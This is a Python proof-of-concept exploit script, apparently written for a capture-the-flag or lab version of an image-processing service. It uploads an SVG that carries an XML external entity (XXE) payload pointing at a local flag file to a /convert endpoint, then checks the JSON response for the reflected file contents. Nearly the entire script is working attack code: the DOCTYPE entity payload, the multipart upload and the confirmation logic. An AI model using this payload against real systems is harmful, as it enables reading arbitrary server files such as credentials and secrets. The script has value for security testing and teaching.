#!/usr/bin/env python3
"""
PoC #6: XXE in the SVG metadata parser (IPM's Java layer)
---------------------------------------------------------
SvgMetadataService.parse() builds a default DocumentBuilderFactory with no
hardening: DOCTYPE is allowed, external entities resolve, and secure processing
is off. An uploaded SVG that declares an external entity pointing at a local
file has that file's contents expanded into the document and reflected back in
the parsed metadata.

This is IPM's own XML parser, reached before the bytes ever get to
ImageMagick's own SVG rendering.

We put the entity in the SVG's text content, pointed at the runtime flag file
written by entrypoint.sh from IPM_FLAG (see ../Dockerfile) - a file IPM's own
convert/upload logic never touches. IPM reflects it under `svg.text` in the
JSON response; we confirm by finding a `FLAG{...}` marker in the reflection.

Run IPM first, then:  python3 06_xxe.py [host] [port]
"""
import json
import re
import sys
import urllib.request
import uuid

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
BASE = f"http://{HOST}:{PORT}"
FLAG_FILE = "/home/ctf/ipm/secret/flag.txt"


def post_svg(svg_bytes):
    boundary = "----ipmPoC" + uuid.uuid4().hex
    body = (f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="image"; filename="x.svg"\r\n'
            f"Content-Type: image/svg+xml\r\n\r\n").encode()
    body += svg_bytes + b"\r\n" + f"--{boundary}--\r\n".encode()
    req = urllib.request.Request(f"{BASE}/convert", data=body, method="POST")
    req.add_header("Content-Type", f"multipart/form-data; boundary={boundary}")
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            return r.status, r.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")


def main():
    svg = (
        '<?xml version="1.0"?>\n'
        f'<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file://{FLAG_FILE}"> ]>\n'
        '<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10">'
        '<desc>&xxe;</desc></svg>'
    ).encode()
    print(f"[*] Uploading SVG with an external entity -> file://{FLAG_FILE}")

    status, resp = post_svg(svg)
    print(f"[*] /convert -> {status} {resp[:300]}")

    try:
        body = json.loads(resp)
        reflected = body.get("svg", {}).get("text", "")
    except Exception as e:
        print(f"[-] Could not parse reflected metadata: {e}")
        sys.exit(1)

    m = re.search(r"FLAG\{[^}]*\}", reflected)
    if m:
        print(f"[+] XXE confirmed - flag file contents reflected in svg.text: {m.group(0)}")
    else:
        print(f"[-] No flag reflected (svg.text={reflected!r}); parser may be hardened")
        sys.exit(1)


if __name__ == "__main__":
    main()
